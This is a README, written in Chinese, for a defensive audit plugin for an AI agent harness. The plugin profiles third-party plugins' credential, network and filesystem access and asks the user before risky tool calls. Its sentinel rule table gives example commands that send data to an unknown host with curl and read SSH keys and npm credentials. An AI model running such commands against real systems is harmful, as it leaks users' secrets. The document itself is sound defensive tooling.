# dsh-plugin-audit

[English](./README.md) · [npm](https://www.npmjs.com/package/dsh-plugin-audit) · [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)

**在让 DSH 插件跑起来之前，先看清它能做什么。** `dsh-plugin-audit` 对第三方插件做静态权限画像——代码触及哪些文件、进程、主机、环境变量和凭证路径，全部附文件/行号证据——并武装一个运行时哨兵：当任何工具调用伸向凭证或向未知主机外发数据时，先请你批准。

## 功能

**1. 静态审计 —— `plugin_audit` 工具。** 指向任意插件目录，扫描源码、`package.json` 和 `cordis.patch.yml`，返回权限画像卡：

```markdown
## Plugin audit: fixture-suspicious-plugin

**Risk: REVIEW** — REVIEW — human review recommended before installing

> 1 files scanned; risk=review; 10 findings (4 review, 4 notice, 2 info)

### Permission profile

| Surface | Observed |
|---|---|
| Filesystem read | **yes** |
| Filesystem write | **yes** |
| Child processes | **yes** |
| Network | **yes** |
| Outbound hosts | `evil.example.com`, `exfil.badhost.io`, `telemetry.example.net` |
| Env variables | `GITHUB_TOKEN`, `HOME` |
| Credential-looking env | `GITHUB_TOKEN` |
| Credential paths | `.npmrc`, `.ssh` |
| Dynamic code execution | **yes** |
| Injected services | `credentials`, `tools` |
| Declared dependencies | — |
| Bundle patch | none |

### Findings

| severity | capability | location | detail |
|---|---|---|---|
| review | env-access | `src/index.js` | Reads a credential-looking environment variable. |
| review | credential-access | `src/index.js:12` | References a credential-bearing path. |
| … | … | … | … |
```

扫描**按契约只读**：每份报告携带 `writesPerformed: false`，另有可选的 invariant 伴随插件在运行时强制该标记。

**2. 运行时哨兵。** 挂在宿主工具管线 `tools/pre-execute` waterfall 上的监听器。待执行的工具调用命中风险规则时，哨兵返回 `ask` 并附原因，交给宿主原有的审批提示处理（无审批通道 → 调用被拒绝，绝不静默放行）：

| 规则 | 会触发审批的示例 |
|---|---|
| 任意工具参数引用凭证路径 | `read` 读 `~/.ssh/id_rsa`、`bash: cat ~/.npmrc` |
| shell 外发指向 `allowedHosts` 之外的主机 | `curl -d @data.json https://collector.unknown.io/x` |
| 写工具指向家目录 dotfile | `write` 写 `~/.zshrc` |

审计是辅助而非裁决——它呈现实证，把判断留给你。

## 兼容性

| 依赖 | 版本 |
| --- | --- |
| DSH 主线 | 已验证 2026-08-14 快照（web + headless profile） |
| Node.js | `^22.19.0 || >=24.0.0` |
| Cordis | `^4.0.0-rc.7`（peer） |

DSH 处于开发者预览期，破坏性变更频繁；上表日期记录本发布验证过的主线快照。`./invariant` 伴随插件已导出但**有意不**接入 `cordis.patch.yml`：官方 profile 不提供 `invariants` 服务，挂起的行会阻断启动。提供该服务的 profile 可自行添加 `{ id: dsh-plugin-audit-invariant, name: 'dsh-plugin-audit/invariant' }`。

## 安装

```bash
# 从 npm
dsh plugin --profile web add dsh-plugin-audit

# 或直接从 GitHub
dsh plugin --profile web add github:jkrandom-sudo/dsh-plugin-audit
```

两条命令都会把包注册进 profile 的 `dsh.profile.bundles` 并应用本包的 `cordis.patch.yml`（一行：`dsh-plugin-audit`，`sentinelEnabled: true`）。重启 profile 后生效。

## 卸载

```bash
dsh plugin --profile web remove dsh-plugin-audit
```

移除依赖与 bundle 行，重启 profile 即可。本插件除 profile 自身的依赖元数据外不做任何写入，无需其他清理。

## 快速上手

在安装了本插件的 profile 会话中，直接说：

```
用 plugin_audit 审计 ~/some-third-party-plugin 这个插件
```

或让模型直接调用工具：

```json
{ "path": "/absolute/path/to/plugin", "format": "markdown" }
```

- `path`（必填）—— 插件的**源码**目录（不是带 `node_modules` 的安装产物）。
- `format` —— `markdown`（默认）或 `json`。

工具返回上面的 Markdown 卡以及 JSON 摘要：`{ markdown, risk, filesScanned, findingsCount, writesPerformed }`。

哨兵无需调用——武装后自动监视会话中的每一次工具调用：

> ⚠ Tool "bash" runs curl toward "collector.unknown.io", which is not in allowedHosts. Outbound data movement needs your confirmation. *（批准 / 拒绝）*

## 配置

bundle patch 向 profile 插入一行；在 profile 的 `cordis.patch.yml` 中编辑：

```yaml
- id: dsh-plugin-audit
  name: 'dsh-plugin-audit'
  config:
    sentinelEnabled: true        # 总开关；false = 只保留静态审计
    allowedHosts:                # shell 外发的预批准主机
      - github.com
      - api.github.com
      - raw.githubusercontent.com
      - registry.npmjs.org
      - '*.deepseek.com'         # 前导 *. = 后缀规则（同时匹配裸域名）
```

静态扫描器无需配置，也不参考 `allowedHosts`——它如实报告发现的每一个网络面。

## 权限与数据

- **扫描器只读** —— 只用读句柄，上限 400 个文件 / 单文件 256 KB，跳过 `node_modules`、`.git`、`lib`、`dist`。可选的 `dsh-plugin-audit/invariant` 伴随插件会在 `plugin_audit` 结果丢失 `writesPerformed: false` 标记时让会话失败。
- **无网络、无遥测** —— 本插件自身不发起任何网络请求。报告中出现的主机名是从被扫描源码提取的文本，从不被访问。
- **决策留在本地** —— `ask` 裁决由宿主既有审批提示中介；插件仅通过 `ctx.logger` 记录原因。
- **哨兵检查范围** —— 只检查经过 `tools/pre-execute` 的工具名与调用参数；不读取文件、环境变量，也不触碰参数之外的会话内容。

## 故障排查

- **启动报 `dsh-plugin-audit/invariant: pending (waiting for service: invariants)`** —— 你把 invariant 行接入了不提供 `invariants` 服务的 profile；移除该行（随包 patch 默认不含它）。
- **agent 看不到 `plugin_audit`** —— 确认包在 profile `package.json` 的 `dsh.profile.bundles` 中，且 `--dump-config` 显示 `dsh-plugin-audit` 行，然后重启。
- **正常命令频繁触发询问** —— 把主机加入 `allowedHosts`，或设 `sentinelEnabled: false` 只保留静态审计。
- **扫描文件比预期少** —— 遍历上限 400 文件 / 256 KB 且跳过构建产物；请审计包的源码目录。

### 已知边界

- **不跟随 symlink 目标** —— 遍历只读目标树内的真实文件。
- **字符串与注释也会触发发现** —— 扫描器基于源码文本而非 AST；注释里的凭证路径与真实代码同等上报。这是有意为之：卡片是供人判断的证据，宁多勿漏。
- **只含构建产物的包至少为 NOTICE** —— 当只发布 `dist`/`lib` 时没有源码可扫，卡片会如实说明，而不是给出干净结论。

## 开发

```bash
pnpm install
pnpm typecheck   # 两个 tsconfig
pnpm test        # vitest：scanner、哨兵规则、插件生命周期、invariant
pnpm build       # tsc -b && tsdown -> lib/
```

目录结构：`src/scanner/` 是与 harness 无关的纯引擎（walk → detect → manifest → report），`src/report.ts` 渲染 Markdown 卡，`src/runtime.ts` 适配 Cordis/DSH 工具契约，`src/sentinel/` 存放纯决策规则与 waterfall 监听器，`src/invariant.ts` 是只读强制伴随插件，`src/events.ts` 为宿主工具管线 waterfall 提供类型（监听器形状在编译期受检）。`tests/fixtures/` 内含测试用样本插件（可疑 / 干净 / 含 patch override）。

本包同时发布 TypeScript 源码并提供 `./src/*` export，遵循官方 [`dsh-external/plugin-template`](https://github.com/dsh-external/plugin-template) 约定：DSH 的开发工具可以直接从源码加载 link 安装的插件（例如插件开发时的 HMR），无需等待重新构建。

## 许可与安全

MIT —— 见 [LICENSE](./LICENSE)。

本插件是审计辅助工具，不是杀毒软件：干净的报告含义是「这些规则未发现证据」，而非「安全」。发现项是带文件/行号证据的启发式结论，供人判断。发现绕过方式——扫描器漏检的能力、可规避的哨兵规则？请在 <https://github.com/jkrandom-sudo/dsh-plugin-audit/issues> 开 issue，敏感内容请先私下报告。
